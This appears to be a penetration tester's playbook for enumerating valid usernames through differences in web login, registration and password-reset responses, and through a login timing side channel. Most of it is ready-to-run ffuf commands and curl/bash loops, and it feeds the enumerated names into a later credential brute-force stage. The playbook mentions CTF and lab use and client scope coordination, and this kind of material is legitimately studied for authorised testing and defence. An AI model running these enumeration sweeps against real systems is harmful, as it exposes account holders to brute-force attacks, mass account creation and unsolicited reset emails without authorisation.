
Enumerate valid usernames via differential response on auth-adjacent forms. Output populates `users_<host>.txt` for consumption by [[Credential Attacks]] Section 5 (enum-fed brute force) triggered from [[Web Attack Checksheet]] sub-block 1.14.

Entry from [[Web Attack Checksheet]]:
- Sub-block 1.6 (login form present) — login-differential enumeration
- Sub-block 1.7 (register form present) — username-taken enumeration
- Sub-block 1.8 (forgot-password form present) — email-sent-differential enumeration
- [[IDOR]] technique file (cross-route) — user-record enumeration via URL parameter

Also entered opportunistically from any newly-discovered auth-adjacent form (gobuster hit routed via re-apply mechanism, subdomain recursion).

Ordering: fastest signal detection first (each form-type probe is 2 curl requests); enumeration attack against whichever signal detected; timing-based enumeration as fallback if no message differential.

---

## Pre-flight checks

Run the appropriate per-flight section (login / register / forgot-password), each optional. 

Shared across all form types:

- `<user_agent_header>` = `-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'`

### Login form (from WAC 1.6)

If [[Static Login Form Prep]] already ran this walk, reuse its emitted variables. Else walk [[Static Login Form Prep]] now.

Consumed downstream by Sections 1.1, 2, 5:

- `<login_username_field>`, `<login_password_field>`, `<login_form_action>`, `<login_path>`
- `<login_static_cookies>`
- `<login_static_hidden_fields>` \*
- `<extra_headers>`
- `<req_flags>`
- `<oracle_ffuf>`
- `<fail_status>`, `<fail_marker>`
- `<threads>`

\* Wherever `<login_static_hidden_fields_appended>` appears at the end of a POST `-d` body, replace it with `&<login_static_hidden_fields>` if non-empty (e.g. `&csrf=abc123`), else with nothing.
### Register form (from WAC 1.7)

⚠️ `<register_path>` = GET path serving the register form. May differ from `<register_form_action>` (POST target).

#### Capture form metadata:

`curl -sL <user_agent_header> http://<host>:<port>/<register_path> | grep -oiE '<(form|input)[^>]*>'`

From output:

- `<register_username_field>` = `name=` of the text input intended for username
- `<register_email_field>` = `name=` of the `type=email` input
- `<register_password_field>` = `name=` of the first `type=password` input
- `<register_confirm_password_field>` = `name=` of the second `type=password` input (may not exist)
- `<register_form_action>` = `action=` of the `<form>` tag (if absent, use `<register_path>`)

#### Capture forwarded static state:

`~/scripts/statefulness_probe.sh --host=<host> --port=<port> --path=<register_path>`

`ROUTE: burp` → escalate register enumeration to Burp (out of scope this playbook); skip Sections 1.2 and 3. `ROUTE: shell` → proceed.

- `<register_static_cookies>` = `STATIC_COOKIES` value
- `<register_static_hidden_fields>` = `STATIC_HIDDEN_FIELDS` value (raw, pre-encoded `name=value&...`, or empty)

Wherever `<register_static_hidden_fields_appended>` appears at the end of a POST `-d` body, replace with `&<register_static_hidden_fields>` if non-empty, else with nothing.

#### Assemble the register request-flag block:

`<register_req_flags>`:

- always: `-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' -H 'Referer: http://<host>:<port>/<register_path>' -H 'Origin: http://<host>:<port>'`
- if `<register_static_cookies>` non-empty, append: `-b '<register_static_cookies>'`

#### Threads:

Reuse `<threads>` from login-form pre-flight if login ran; else run the [[Static Login Form Prep]] rate-limit probe against `<register_form_action>` to derive.

### Forgot-password form (from WAC 1.8)

⚠️ `<forgot_path>` = GET path serving the forgot-password form. May differ from `<forgot_form_action>` (POST target).

#### Capture form metadata:

`curl -sL <user_agent_header> http://<host>:<port>/<forgot_path> | grep -oiE '<(form|input)[^>]*>'`

From output:

- `<forgot_identifier_field>` = `name=` of the single input (username or email)
- `<forgot_form_action>` = `action=` of the `<form>` tag (if absent, use `<forgot_path>`)

#### Capture forwarded static state:

`~/scripts/statefulness_probe.sh --host=<host> --port=<port> --path=<forgot_path>`

`ROUTE: burp` → escalate forgot-password enumeration to Burp (out of scope); skip Sections 1.3 and 4. `ROUTE: shell` → proceed.

- `<forgot_static_cookies>` = `STATIC_COOKIES` value
- `<forgot_static_hidden_fields>` = `STATIC_HIDDEN_FIELDS` value

Wherever `<forgot_static_hidden_fields_appended>` appears at the end of a POST `-d` body, replace with `&<forgot_static_hidden_fields>` if non-empty, else with nothing.

#### Assemble the forgot request-flag block:

`<forgot_req_flags>`:

- always: `-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' -H 'Referer: http://<host>:<port>/<forgot_path>' -H 'Origin: http://<host>:<port>'`
- if `<forgot_static_cookies>` non-empty, append: `-b '<forgot_static_cookies>'`

#### Threads:

Reuse `<threads>` from login-form pre-flight if login ran; else run the SLFP rate-limit probe against `<forgot_form_action>` to derive.

---
## Users accumulator convention

Any valid username enumerated by any section below appends to `users_<host>.txt`:

`echo '<username>' >> users_<host>.txt`

De-duplicate periodically: `sort -u users_<host>.txt -o users_<host>.txt`.

---

## 1. Signal detection

### 1.1 Login form differential (from WAC sub-block 1.6)

Browser + DevTools.

Submit two probes; between them, compare rendered flash message + Network row (Status, redirect Location):

⚠️ If `<login_username_field>` takes an email-format value, append `@<known_domain>` to each candidate in the loop below (e.g. `admin@target.com`), else server-side validation may silently reject all before DB lookup.
#### Known invalid creds:

1. `<login_username_field>` = `xyzabc123xxx` + `<login_password_field>` = `wrong_ZZZ_9999` — invalid-user baseline

Record the following: 
i. Flash message text (e.g. `Invalid email or password`)
ii. Response Header Status (e.g. `200`)
iii. Response Header Location, if applicable

#### Plausible Creds:

2. `<login_username_field>` = `admin` + `<login_password_field>` = `wrong_ZZZ_9999` — plausible-user probe. 

If baseline and probe match on all four axes, try again with `administrator`, then `test`, `user`, `guest`, `root` before concluding no signal.
#### Route (evaluated per plausible against baseline; any single plausible showing a content-axis signal is enough):

⚠️ Before routing to §2 on any content-axis signal, resubmit the differing plausible once. Same differential → confirmed, proceed. Response matches baseline on retry → transient anomaly (rate-limit page / CSRF timeout / server flap), discard, continue with the next plausible.

- Flash message text differs → set `<valid_user_message>` = text unique to the plausible → 2
- Status differs → 2 (use invalid-baseline status as `-fc` filter)
- Location differs (redirect) → 2 (use invalid-baseline Location as `-fr` filter)
- No content-axis signal on any plausible → 5. Timing is deferred here because a single browser sample can't separate real server-work delta from network jitter; §5 takes 5 samples per user to resolve. §5 will route back to 1.2 if its multi-sample check also finds no timing signal.

### 1.2 Register form differential (from WAC sub-block 1.7)

Browser + DevTools. 

Submit two probes; between them, compare rendered flash message + Network row (Status, redirect Location):

⚠️ If actual application domain known, replace `@example.com` below with `@<known_domain>`.

1. Register an account with a novel username. Record flash message text, response status, and Location (if redirect).

2. Register a second account with `<register_username_field>` = `admin` and `<register_email_field>` = `admin@example.com`. If matches baseline on all axes, retry with `administrator`, `test`, `user`, `guest`, `root`, `webmaster`, `wpadmin` (email = `<username>@example.com` each time) until signal detected or list exhausted.

Route:

- Flash message text differs → set `<username_taken_message>` = text unique to the plausible → 3
- Status differs → 3 (use baseline status as `-fc` filter)
- Location differs (redirect) → 3 (use baseline Location as `-fr` filter)
- No content-axis signal on any plausible → 1.3

**Email-only registration (no separate `<register_username_field>`):** Enumeration target is email addresses. Plausibles become `admin@<known_domain>`, `administrator@<known_domain>`, etc. Output entries in `users_<host>.txt` will be email addresses.

### 1.3 Forgot-password form differential (from WAC sub-block 1.8)

Browser + DevTools.

Submit two probes; between them, compare rendered flash message + Network row (Status, redirect Location):

⚠️ Modern security-aware apps deliberately normalise the response ("If an account exists, a reset link has been sent") regardless of identifier validity — content-axis signal absent by design. If baseline and all plausibles return identical responses, route quickly to no-enum rather than forcing a signal. Some apps echo the submitted identifier back ("Reset link sent to `<identifier>`") — eyeball for echo before treating message-text delta as enum signal.

⚠️ If `<forgot_identifier_field>` takes email format, append `@<known_domain>` (or `@example.com` if unknown) to each candidate below.

1. `<forgot_identifier_field>` = `xyzabc123xxx` (or `xyzabc123xxx@<domain>.com` if email format) — invalid-identifier baseline

Record: flash message text, response status, Location (if redirect).

2. `<forgot_identifier_field>` = `admin` (or `admin@<domain>.com`). If matches baseline on all axes, retry with `administrator`, `test`, `user`, `guest`, `root`, `webmaster`, `wpadmin` until signal detected or list exhausted.

Route (evaluated per plausible against baseline; any single plausible showing a content-axis signal is enough):

⚠️ Before routing to §4 on any content-axis signal, resubmit the differing plausible once. Same differential → confirmed, proceed. Response matches baseline on retry → transient (rate-limit page, dispatch failure), discard, continue with the next plausible. If retries 3+ hit rate-limit pages, work with what you've collected.

- Flash message text differs → set `<valid_user_message>` = text unique to the plausible → 4. Also append the plausible identifier to `users_<host>.txt` immediately (`echo '<identifier>' >> users_<host>.txt`) — DIFF means confirmed enumerated.
- Status differs → 4 (use invalid-baseline status as `-fc` filter)
- Location differs (redirect) → 4 (use invalid-baseline Location as `-fr` filter)
- No content-axis signal on any plausible → return to [[Web Attack Checksheet]]

---

## 2. Enumeration attack — login form

Fuzz `<login_username_field>` with fixed invalid password `wrong_ZZZ_9999`. Filter by the signal identified in §1.1.

⚠️ If `<login_username_field>` takes email format, replace `FUZZ` with `FUZZ@<known_domain>` in the `-d` string below.

### 2a. Message-text signal

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<login_username_field>=FUZZ&<login_password_field>=wrong_ZZZ_9999<login_static_hidden_fields_appended>' <req_flags> -enc 'FUZZ:urlencode' -t <threads> -u http://<host>:<port>/<login_form_action> -mr '<valid_user_message>' -o found_users_login.csv -of csv`

### 2b. Status signal

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<login_username_field>=FUZZ&<login_password_field>=wrong_ZZZ_9999<login_static_hidden_fields_appended>' <req_flags> -enc 'FUZZ:urlencode' -t <threads> -u http://<host>:<port>/<login_form_action> -fc <invalid_baseline_status> -o found_users_login.csv -of csv`

### 2c. Location signal (edge case only)

Most Location-differ signals in §1.1 coincide with a status differential (e.g. 302 valid vs 200 invalid) → route via 2b. This block handles the edge where BOTH baseline and plausible are 302 to different Locations — ffuf's regex flags can't match on response headers, so bash-loop fallback:

```bash
URL="http://<host>:<port>/<login_form_action>"
WORDLIST=/usr/share/seclists/Usernames/Names/names.txt
while read u; do
  loc=$(curl -sI -X POST <req_flags> --data-urlencode "<login_username_field>=$u" -d "<login_password_field>=wrong_ZZZ_9999<login_static_hidden_fields_appended>" "$URL" | tr -d '\r' | grep -i '^Location: ' | cut -d' ' -f2)
  [ -n "$loc" ] && [ "$loc" != "<invalid_baseline_location>" ] && { echo "$u" >> users_<host>.txt; printf 'HIT %s (loc=%s)\n' "$u" "$loc"; }
done < "$WORDLIST"
sort -u users_<host>.txt -o users_<host>.txt
```

Sequential (no `-t`). `names.txt` @ ~0.1s ≈ 15 min.

### Extract and append (ffuf output, 2a and 2b only)

```bash
tail -n +2 found_users_login.csv | cut -d ',' -f1 >> users_<host>.txt
sort -u users_<host>.txt -o users_<host>.txt
```

Route:

- `found_users_login.csv` non-empty → append to `users_<host>.txt` per extraction block above → 6
- Zero hits despite §1.1 signal → retry with `/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt`. Still zero → target likely uses custom/employee-specific usernames; escalate to OSINT-derived wordlist (LinkedIn scrape, breach data, company naming convention) if scope allows, else §2 exhausted → 6 (`users_<host>.txt` may still hold entries direct-appended by §§1.1-1.3 DIFF probes)

---

## 3. Enumeration attack — register form

Fuzz `<register_username_field>` on registration form. Filter by `<username_taken_message>` from §1.2.

⚠️ Every non-hit iteration **CREATES A REAL ACCOUNT** on the target (available usernames register successfully). Wordlist sweeps produce thousands of accounts as state pollution. Acceptable on CTF/OSCP+/lab (throwaway boxes); on real engagements coordinate with client on scope-appropriate wordlist size before running.

⚠️ `<register_email_field>` uses same `FUZZ` token as username so every iteration gets a unique email — otherwise the second-onwards probe hits "email already taken" and collapses signal across the wordlist. Replace `example.com` with `<known_domain>` if the app enforces domain allowlists.

⚠️ Password `P@ssw0rd_ZZZ_9999!` chosen to satisfy typical policy (upper/lower/digit/symbol, ≥12 chars). If §1.2 baseline required a different policy, substitute here.

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<register_username_field>=FUZZ&<register_email_field>=FUZZ@example.com&<register_password_field>=P@ssw0rd_ZZZ_9999!&<register_confirm_password_field>=P@ssw0rd_ZZZ_9999!<register_static_hidden_fields_appended>' <register_req_flags> -enc 'FUZZ:urlencode' -t <threads> -u http://<host>:<port>/<register_form_action> -mr '<username_taken_message>' -o found_users_register.csv -of csv`

### Extract and append

```bash
tail -n +2 found_users_register.csv | cut -d ',' -f1 >> users_<host>.txt
sort -u users_<host>.txt -o users_<host>.txt
```

Route:

- `found_users_register.csv` non-empty → append per extraction block → 6
- Zero hits despite §1.2 signal → retry with `/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt`. Still zero → §3 exhausted → 6 (`users_<host>.txt` may still hold entries direct-appended by §§1.1-1.3 DIFF probes)

---

## 4. Enumeration attack — forgot-password form

Fuzz `<forgot_identifier_field>` on password-reset form. Filter by signal identified in §1.3.

⚠️ At scale this dispatches an email to every enumerated valid identifier's registered address (potentially 10s-100s of emails). CTF/lab: dispatch usually inert or captured. Real engagement: coordinate with client before running; scope-restricted wordlist or off-hours attack window may be required.

⚠️ If `<forgot_identifier_field>` takes email format, replace `FUZZ` with `FUZZ@<known_domain>` (or `FUZZ@example.com` if unknown) in the `-d` string.

⚠️ Forgot endpoints are often more heavily rate-limited than login. If ffuf sees 429s, reduce `-t` to 1 and add `-p 1.0`. If pre-flight inherited `<threads>` from login and it doesn't hold here, re-derive against `<forgot_form_action>`.

### 4a. Message-text signal

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<forgot_identifier_field>=FUZZ<forgot_static_hidden_fields_appended>' <forgot_req_flags> -enc 'FUZZ:urlencode' -t <threads> -u http://<host>:<port>/<forgot_form_action> -mr '<valid_user_message>' -o found_users_reset.csv -of csv`

### 4b. Status signal

`ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '<forgot_identifier_field>=FUZZ<forgot_static_hidden_fields_appended>' <forgot_req_flags> -enc 'FUZZ:urlencode' -t <threads> -u http://<host>:<port>/<forgot_form_action> -fc <invalid_baseline_status> -o found_users_reset.csv -of csv`

### 4c. Location signal (edge case only)

Most Location differentials coincide with status differentials → 4b. Bash-loop fallback for the BOTH-302-to-different-Locations edge (ffuf can't match on headers):

```bash
URL="http://<host>:<port>/<forgot_form_action>"
WORDLIST=/usr/share/seclists/Usernames/Names/names.txt
while read u; do
  loc=$(curl -sI -X POST <forgot_req_flags> -d "<forgot_identifier_field>=$u<forgot_static_hidden_fields_appended>" "$URL" | tr -d '\r' | grep -i '^Location: ' | cut -d' ' -f2)
  [ -n "$loc" ] && [ "$loc" != "<invalid_baseline_location>" ] && { echo "$u" >> users_<host>.txt; printf 'HIT %s (loc=%s)\n' "$u" "$loc"; }
done < "$WORDLIST"
sort -u users_<host>.txt -o users_<host>.txt
```

Sequential. `names.txt` @ ~0.1s ≈ 15 min. Wordlists with special characters (xato-net) → escalate to Burp Intruder for this loop.

### Extract and append (ffuf output, 4a and 4b only)

```bash
tail -n +2 found_users_reset.csv | cut -d ',' -f1 >> users_<host>.txt
sort -u users_<host>.txt -o users_<host>.txt
```

Route:

- `found_users_reset.csv` non-empty → append per extraction block → 6
- Zero hits despite §1.3 signal → retry with `/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt`. Still zero → §4 exhausted → 6 (`users_<host>.txt` may still hold entries direct-appended by §§1.1-1.3 DIFF probes)

---

## 5. Timing-based enumeration (fallback)

Reached from §1.1 when no content-axis signal on any plausible. Detects and enumerates via server-work timing delta (bcrypt / DB-lookup-only-for-valid-users side channel). Login form only — register/forgot timing is unreliable and out of scope this section.

Three sub-blocks: detection → attack → verify. All three run in the same shell session (function definitions persist).

### 5.1 Detection — baseline vs 8-plausible batched verdict

⚠️ If `<login_username_field>` takes email format, append `@<known_domain>` to each candidate in the loop.

```bash
URL="http://<host>:<port>/<login_form_action>"
median() { sort -n | awk 'BEGIN{c=0} {a[c++]=$1} END{if(c%2)print a[int(c/2)]; else printf "%.6f\n",(a[c/2-1]+a[c/2])/2}'; }
sample_median() {
  for i in $(seq 1 5); do
    curl -s -X POST -o /dev/null -w '%{time_total}\n' <req_flags> -d "<login_username_field>=$1&<login_password_field>=wrong_ZZZ_9999<login_static_hidden_fields_appended>" "$URL"
  done | median
}
baseline=$(sample_median 'xyzabc123xxx')
printf 'baseline (invalid) median: %ss\n\n' "$baseline"
for u in admin administrator root test guest user webmaster wpadmin; do
  m=$(sample_median "$u")
  awk -v m="$m" -v b="$baseline" -v u="$u" 'BEGIN{d=m-b; v=(d>0.200)?"SIGNAL":"flat"; s=(d>=0)?"+":""; printf "%-8s [%-16s] median=%.3fs  delta=%s%.3fs\n", v, u, m+0, s, d}'
done
```


Route:

- Any `SIGNAL` verdict → 5.2. Record `<baseline_median>` from output.
- All `flat` → no timing signal viable. Return to [[Web Attack Checksheet]]

### 5.2 Attack — wordlist sweep, single-sample threshold filter

```bash
WORDLIST=/usr/share/seclists/Usernames/Names/names.txt
THRESHOLD=$(awk -v b="<baseline_median>" 'BEGIN{printf "%.3f", b+0.150}')
> timing_candidates.txt
while read u; do
  t=$(curl -s -X POST -o /dev/null -w '%{time_total}' <req_flags> -d "<login_username_field>=$u&<login_password_field>=wrong_ZZZ_9999<login_static_hidden_fields_appended>" "$URL")
  awk -v t="$t" -v h="$THRESHOLD" 'BEGIN{exit !(t+0>h+0)}' && { printf 'HIT  %-16s %.3fs\n' "$u" "$t"; echo "$u" >> timing_candidates.txt; }
done < "$WORDLIST"
printf '\nAttack complete: %d candidates in timing_candidates.txt\n' "$(wc -l < timing_candidates.txt)"
```

Sequential by design — parallel requests contend for server CPU and destroy timing signal. Runtime ≈ (wordlist_size × per-request-median). `names.txt` @ ~0.1s ≈ 15 min.

Route: 5.3.

### 5.3 Verify — 5-sample re-check filters false positives

```bash
> confirmed_users.txt
while read u; do
  m=$(sample_median "$u")
  awk -v m="$m" -v b="<baseline_median>" -v u="$u" 'BEGIN{d=m-b; if(d>0.200){printf "CONFIRMED  %-16s median=%.3fs  delta=+%.3fs\n", u, m+0, d; print u > "/dev/stderr"}}' 2>>confirmed_users.txt
done < timing_candidates.txt
cat confirmed_users.txt >> users_<host>.txt
sort -u users_<host>.txt -o users_<host>.txt
printf '\nVerified: %d / %d candidates confirmed. Appended to users_<host>.txt.\n' "$(wc -l < confirmed_users.txt)" "$(wc -l < timing_candidates.txt)"
```

Reuses `sample_median` and `median` functions from 5.1 — must run in same shell session.

Route: 6.

---

## 6. Post-enumeration routing

Once `users_<host>.txt` is populated:

1. Log to `route_<ip>.txt`:

    `printf '[Username Enumeration] APPLIED: %d valid usernames enumerated on <host>:<port>\n' $(wc -l < users_<host>.txt) >> route_<ip>.txt`

2. Route:

- Continue current [[Web Attack Checksheet]] Step 1 walk — sub-block 1.14 (credential attack with enumerated usernames) will fire later in the walk and consume `users_<host>.txt`
- If already at sub-block 1.14 when this file completes → sub-block 1.14 fires immediately with populated list
- If entered from [[IDOR]] technique file (cross-route from URL params enumeration) → return to IDOR to continue any remaining IDOR work, then normal WAC walk continues

---

## Exhaustion

No forms with enumeration signals detected AND timing-based enum inconclusive → target does not leak username validity. Return to [[Web Attack Checksheet]].
